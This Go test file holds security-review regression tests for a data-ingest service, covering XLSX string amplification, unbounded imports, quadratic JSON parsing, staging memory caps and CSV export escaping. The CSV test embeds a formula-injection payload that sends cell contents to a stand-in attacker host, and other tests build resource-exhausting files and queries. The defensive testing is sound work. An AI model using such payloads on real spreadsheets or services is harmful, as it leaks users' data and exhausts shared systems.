package ingest

// Phase 5 security review: regression tests (each comment describes the
// original finding; the assertions pin the fix).

import (
	"bytes"
	"context"
	"encoding/csv"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/xuri/excelize/v2"

	"abidata/internal/catalog"
	"abidata/internal/dbx"
	"abidata/internal/fault"
	"abidata/internal/query"
	"abidata/internal/workspace"
)

// An XLSX whose cells all reference one large shared string is tiny on the wire,
// but every reference is materialised as a separate value in the staging
// database. Nothing bounds the staging file size (no per-workspace staging
// quota, no output-size cap), so a builder can fill the node's disk.
func TestSecReview_XLSXSharedStringAmplification(t *testing.T) {
	e := newEnv(t)
	big := strings.Repeat("A", 64<<10) // 64 KiB, well under maxFieldBytes
	f := excelize.NewFile()
	const rowsN, colsN = 100, 8
	for r := 1; r <= rowsN; r++ {
		row := make([]any, colsN)
		for c := range row {
			if r == 1 {
				row[c] = fmt.Sprintf("h%d", c)
			} else {
				row[c] = big
			}
		}
		cell, _ := excelize.CoordinatesToCellName(1, r)
		if err := f.SetSheetRow("Sheet1", cell, &row); err != nil {
			t.Fatal(err)
		}
	}
	var b bytes.Buffer
	if err := f.Write(&b); err != nil {
		t.Fatal(err)
	}
	// The staging database is capped (lowered here): the import is refused
	// and nothing is left behind.
	old := MaxImportStagingBytes
	MaxImportStagingBytes = 8 << 20
	defer func() { MaxImportStagingBytes = old }()
	_, err := e.svc.Upload(e.ctx, e.ws, "u", UploadOptions{Filename: "bomb.xlsx"}, bytes.NewReader(b.Bytes()))
	if fault.Classify(err).Code != fault.QuotaExceeded {
		t.Fatalf("expected QUOTA_EXCEEDED, got %v", err)
	}
	dir, _ := e.svc.stagingDir(e.ws)
	if ents, _ := os.ReadDir(dir); len(ents) != 0 {
		t.Fatalf("staging files left: %v", ents)
	}
}

// Nothing limits how many pending imports a workspace may hold: every upload
// keeps its source file and staging DB on disk for 24 h.
func TestSecReview_UnboundedPendingImports(t *testing.T) {
	e := newEnv(t)
	data := "a,b\n" + strings.Repeat("xxxxxxxxxx,yyyyyyyyyy\n", 5000)
	for i := 0; i < MaxPendingImports; i++ {
		e.upload(fmt.Sprintf("f%d.csv", i), data, UploadOptions{})
	}
	_, err := e.svc.Upload(e.ctx, e.ws, "u", UploadOptions{Filename: "more.csv"}, strings.NewReader(data))
	if fault.Classify(err).Code != fault.QuotaExceeded {
		t.Fatalf("expected the pending-import cap, got %v", err)
	}
}

// readJSONObjects de-duplicates an object's keys with a linear scan per key and
// only enforces MaxColumns after the whole object has been read, so a single
// object with n distinct keys costs O(n^2). The loop never checks ctx, so the
// upload keeps burning a core after the client disconnects. A 100 MiB file holds
// ~7M keys: on the order of 10^13 comparisons.
func TestSecReview_JSONKeyDedupQuadratic(t *testing.T) {
	dir := t.TempDir()
	write := func(n int) string {
		var b strings.Builder
		b.WriteString("[{")
		for i := 0; i < n; i++ {
			if i > 0 {
				b.WriteByte(',')
			}
			fmt.Fprintf(&b, `"k%07d":0`, i)
		}
		b.WriteString("}]")
		p := filepath.Join(dir, fmt.Sprintf("o%d.json", n))
		if err := os.WriteFile(p, []byte(b.String()), 0o600); err != nil {
			t.Fatal(err)
		}
		return p
	}
	measure := func(n int) time.Duration {
		p := write(n)
		start := time.Now()
		_ = readJSONObjects(p, true, func([]string, []json.RawMessage) error { return nil })
		return time.Since(start)
	}
	// A too-wide object now fails as soon as it passes MaxColumns keys.
	p := write(40000)
	start := time.Now()
	err := readJSONObjects(p, true, func([]string, []json.RawMessage) error { return nil })
	if err == nil || time.Since(start) > time.Second {
		t.Fatalf("wide object: %v after %v", err, time.Since(start))
	}
	_ = measure
}

// Run-staging connections are opened without sqlite3.WithMaxMemory, so they get
// the driver default (256 MiB of wasm memory each) instead of the 64 MiB reader
// cap, and they use temp_store=MEMORY. A job may hold 8 handles; wasm memory
// never shrinks until the handle closes at the end of the run, so one run can
// pin ~2 GiB and each workspace may run 2 jobs at once: the node can be driven
// out of memory by a few builders. This query needs more than a reader may use
// and succeeds on staging.
func TestSecReview_StagingQueryMemoryCapLooserThanReaders(t *testing.T) {
	e := newEnv(t)
	rs := e.fresh()
	h, err := rs.Create(context.Background(), []string{"a"})
	if err != nil {
		t.Fatal(err)
	}
	if err := rs.Insert(context.Background(), h, []any{"x"}); err != nil {
		t.Fatal(err)
	}
	// ~100+ MiB of sorter data, all of it in memory (temp_store=MEMORY).
	const q = `WITH RECURSIVE c(x) AS (SELECT 1 UNION ALL SELECT x + 1 FROM c WHERE x < 100000)
		SELECT count(*) AS n FROM (SELECT x, randomblob(1024) AS b FROM c ORDER BY b)`
	// Staging now has the reader's memory cap but sorts spill to a temp file
	// (temp_store=FILE), so the large sort succeeds without pinning memory.
	_, rows, err := rs.Query(context.Background(), h, q, nil)
	if err != nil {
		t.Fatalf("staging sort: %v", err)
	}
	t.Logf("staging query sorted %v rows of 1 KiB via temp files", rows[0][0])
	// A query that must hold more than the cap in memory is refused.
	_, _, err = rs.Query(context.Background(), h, `SELECT length(group_concat(randomblob(1048576))) FROM (WITH RECURSIVE c(x) AS (SELECT 1 UNION ALL SELECT x + 1 FROM c WHERE x < 100) SELECT x FROM c)`, nil)
	if err == nil {
		t.Fatal("staging connection had no memory cap")
	}
}

// CSV exports only neutralise formula prefixes for short_text/long_text/
// hyperlink columns. A calculated field with a text result (e.g. Name || ”)
// carries editor-supplied text verbatim, so "=HYPERLINK(...)" typed by an
// editor reaches a builder's spreadsheet as a live formula. Header cells (field
// display names, query column aliases) are never neutralised either.
func TestSecReview_CSVExportCalculatedFormula(t *testing.T) {
	e := newEnv(t)
	tb := e.table("People",
		catalog.ColumnSpec{DisplayName: "Name", Type: catalog.ShortText},
		catalog.ColumnSpec{DisplayName: "Label", Type: catalog.Calculated, Options: catalog.TypeOptions{Expression: "Name || ''", ResultType: "text"}},
		catalog.ColumnSpec{DisplayName: "=1+1", Type: catalog.ShortText},
	)
	payload := `=HYPERLINK("http://evil.example/?"&A1,"x")`
	if err := e.l.Write(e.ctx, workspace.Background, func(tx dbx.Tx) error {
		_, err := tx.Exec(e.ctx, `INSERT INTO `+catalog.Quote(tb.PhysicalName)+`(`+catalog.Quote(col2(t, tb, "Name").PhysicalName)+`) VALUES (?)`, payload)
		return err
	}); err != nil {
		t.Fatal(err)
	}
	_, body := e.export(ExportRequest{SourceKind: "table", SourceID: tb.ID, Format: "csv"}, query.Policy{})
	recs, err := csv.NewReader(strings.NewReader(body)).ReadAll()
	if err != nil || len(recs) != 2 {
		t.Fatalf("%v %v", recs, err)
	}
	if recs[1][1] != "'"+payload {
		t.Fatalf("short_text column should be neutralised: %q", recs[1][1])
	}
	if recs[1][2] != "'"+payload {
		t.Fatalf("calculated column not neutralised: %q", recs[1][2])
	}
	if recs[0][3] != "'=1+1" {
		t.Fatalf("header not neutralised: %q", recs[0][3])
	}
}
